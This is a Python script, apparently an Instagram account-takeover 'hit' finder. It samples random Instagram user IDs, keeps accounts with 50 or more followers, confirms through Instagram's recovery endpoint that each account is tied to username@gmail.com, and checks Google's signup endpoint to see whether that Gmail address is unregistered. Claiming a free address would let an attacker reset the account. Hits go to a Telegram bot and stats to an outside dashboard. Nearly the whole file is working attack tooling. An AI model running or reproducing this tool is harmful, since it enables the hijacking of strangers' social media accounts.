import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import init

init(autoreset=True)

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL - Dashboard stats sync
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=4)
    except:
        pass

# Dashboard automatically passes ID and Token
if len(sys.argv) > 2:
    ID = sys.argv[1]
    TOKEN = sys.argv[2]
else:
    ID = input("\033[1;36mEnter Telegram ID: ")
    TOKEN = input("\033[1;36mEnter Bot Token: ")
# =========================================================

aniiconfig = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "token_file": "tl.txt",
    "aniidomain": "@gmail.com"
}

# Stats Variables
hits = 0
bad_count = 0
good_ig = 0
infoinsta = {}
stats_lock = Lock()

def get_google_token():
    """Initial token setup for Gmail checking"""
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        host = ''.join(choice(alphabet) for _ in range(20))
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        res = requests.get("https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB", headers=headers)
        match = re.search('data-initial-setup-data=".*?&quot;(.*?)&quot;', res.text)
        if match:
            tok = match.group(1)
            with open(aniiconfig["token_file"], 'w') as f:
                f.write(f"{tok}//{host}")
        else:
            time.sleep(2)
            get_google_token()
    except:
        time.sleep(2)
        get_google_token()

if not os.path.exists(aniiconfig["token_file"]):
    get_google_token()

def check_gmail(email_prefix):
    global hits, bad_count
    try:
        if not os.path.exists(aniiconfig["token_file"]): get_google_token()
        with open(aniiconfig["token_file"], 'r') as f:
            tl, host = f.read().split('//')
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
        res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
        
        if '"gf.uar",1' in res.text:
            with stats_lock: hits += 1
            send_to_dashboard('hit')
            return True
        else:
            with stats_lock: bad_count += 1
            send_to_dashboard('bad')
            return False
    except: return False

def check_instagram(email):
    global good_ig, bad_count
    headers = {'User-Agent': generate_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'signed_body': f'sign.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{email}"}}', 'ig_sig_key_version': '4'}
    try:
        res = requests.post(aniiconfig["instagram_recovery_url"], headers=headers, data=data).text
        if email in res:
            with stats_lock: good_ig += 1
            if check_gmail(email.split('@')[0]):
                send_hit_telegram(email)
        else:
            send_to_dashboard('bad')
            with stats_lock: bad_count += 1
    except: pass

def get_year(uid):
    try:
        uid = int(uid)
        ranges = [
            (1278889, 2010), (17750000, 2011), (279760000, 2012), (900990000, 2013),
            (1629010000, 2014), (2369359761, 2015), (4239516754, 2016), (6345108209, 2017),
            (10016232395, 2018), (27238602159, 2019), (43464475395, 2020)
        ]
        for limit, year in ranges:
            if uid <= limit: return year
        return 2024
    except: return "N/A"

def send_hit_telegram(email):
    user = email.split('@')[0]
    acc = infoinsta.get(user, {})
    # Fixed: Direct variables to avoid bracket errors
    msg = f"""
━━━━━━━━━━━━━━━ 🚀
🌠 LEGACY HIT FOUND!
🛰 USER: {user}
📅 YEAR: {get_year(acc.get('pk', 0))}
📈 FOLLOWERS: {acc.get('follower_count', 0)}
📧 EMAIL: {email}
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={msg}", timeout=10)
    except: pass

def worker():
    while True:
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        data = {
            'lsd': lsd,
            'variables': json.dumps({'id': random.randrange(6345108210, 10016232395), 'render_surface': 'PROFILE'}),
            'doc_id': '25618261841150840'
        }
        try:
            res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
            user_data = res.json().get('data', {}).get('user', {})
            username = user_data.get('username')
            # 50+ Followers filter for premium accounts
            if username and user_data.get('follower_count', 0) >= 50:
                infoinsta[username] = user_data
                check_instagram(username + aniiconfig["aniidomain"])
            else:
                send_to_dashboard('bad')
        except:
            time.sleep(1)

# Threads - 15 threads for stability on Render
for _ in range(15):
    Thread(target=worker, daemon=True).start()

while True: 
    time.sleep(10)
